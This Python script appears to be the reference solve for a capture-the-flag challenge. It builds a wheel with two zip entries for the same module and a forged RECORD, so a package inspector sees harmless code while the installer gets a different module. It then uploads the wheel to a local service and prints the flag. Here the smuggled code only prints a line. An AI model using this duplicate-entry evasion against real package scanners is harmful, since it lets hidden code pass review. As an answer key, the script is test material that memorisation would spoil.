#!/usr/bin/env python3
"""Build and submit the duplicate-entry wheel used by the reference solve."""

import argparse
import base64
import csv
import hashlib
from io import BytesIO, StringIO
import json
import urllib.request
import uuid
import warnings
from zipfile import ZIP_DEFLATED, ZipFile


def make_wheel() -> tuple[str, bytes]:
    name, version = "schrodinger-probe", "1.0.0"
    module = name.replace("-", "_")
    dist_info = f"{module}-{version}.dist-info"
    filename = f"{module}-{version}-py3-none-any.whl"
    module_path = f"{module}/__init__.py"
    safe_module = b'"""Small package probe."""\n__version__ = "1.0.0"\n'
    runtime_module = (
        b'print("Package import check complete.", flush=True)\n'
        b'__version__ = "1.0.0"\n'
    )
    metadata = (
        "Metadata-Version: 2.3\nName: schrodinger-probe\nVersion: 1.0.0\n"
        "Summary: Small package probe.\nLicense-Expression: MIT\n\n"
    ).encode()
    wheel = b"Wheel-Version: 1.0\nGenerator: package-exchange\nRoot-Is-Purelib: true\nTag: py3-none-any\n\n"
    members = {
        module_path: safe_module,
        f"{dist_info}/METADATA": metadata,
        f"{dist_info}/WHEEL": wheel,
    }
    record = StringIO()
    rows = []
    for path, content in members.items():
        digest = base64.urlsafe_b64encode(hashlib.sha256(content).digest()).rstrip(b"=").decode()
        # RECORD describes the final module member installed by pip.
        if path == module_path:
            content = runtime_module
            digest = base64.urlsafe_b64encode(hashlib.sha256(content).digest()).rstrip(b"=").decode()
        rows.append((path, f"sha256={digest}", str(len(content))))
    rows.append((f"{dist_info}/RECORD", "", ""))
    csv.writer(record, lineterminator="\n").writerows(rows)
    members[f"{dist_info}/RECORD"] = record.getvalue().encode()

    data = BytesIO()
    with ZipFile(data, "w", ZIP_DEFLATED) as archive:
        archive.writestr(module_path, safe_module)
        for path, content in list(members.items())[1:]:
            archive.writestr(path, content)
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", UserWarning)
            archive.writestr(module_path, runtime_module)
    return filename, data.getvalue()


def request_json(url: str, data: bytes | None = None, headers: dict | None = None) -> dict:
    request = urllib.request.Request(url, data=data, headers=headers or {}, method="POST" if data is not None else "GET")
    with urllib.request.urlopen(request, timeout=90) as response:
        return json.load(response)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")
    filename, wheel = make_wheel()
    boundary = "----schrodinger-" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + wheel + f"\r\n--{boundary}--\r\n".encode()
    package = request_json(
        f"{base_url}/api/packages",
        body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    package_id = package["package_id"]
    request_json(f"{base_url}/api/packages/{package_id}/inspection", b"")
    session = request_json(f"{base_url}/api/packages/{package_id}/runtime", b"")
    flag = session.get("flag")
    if not flag:
        raise SystemExit(f"Runtime did not release a flag; inspect package {package_id} logs.")
    print(flag)


if __name__ == "__main__":
    main()
